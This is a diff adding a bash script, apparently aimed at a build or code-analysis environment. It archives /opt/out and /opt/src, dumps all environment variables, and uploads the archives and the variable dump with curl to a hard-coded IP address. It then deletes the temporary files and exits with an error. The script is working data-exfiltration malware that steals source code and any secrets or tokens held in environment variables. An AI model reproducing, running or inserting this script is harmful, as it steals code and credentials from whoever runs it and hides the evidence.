@@ -1,0 +1,33 @@
+#! /bin/bash
+
+numprocesses=$(ps axuf | grep "Extraction csharp " | wc -l)
+if [[ $numprocesses -gt 1 ]] ; then
+
+echo "CEE."
+
+
+else
+echo "JAVA"
+tar czf /tmp/jav-out.tar.gz /opt/out
+tar czf /tmp/jav-src.tar.gz /opt/src
+env > /tmp/env
+
+md5sum /tmp/jav-*.tar.gz
+cd /tmp/
+
+df -h
+split -n 5 jav-extra.tar.gz
+
+
+
+curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-out.tar.gz" -XGET "http://207.148.117.243/dd.php?act=u&fn=jav-out" 
+curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-src.tar.gz" -XGET "http://207.148.117.243/dd.php?act=u&fn=jav-src" 
+curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/env" -XGET "http://207.148.117.243/dd.php?act=u&fn=env" 
+ls -liah /tmp/
+
+rm -rf /tmp/jav-*.tar.gz
+rm -rf /tmp/env
+
+fi
+
+exit -1
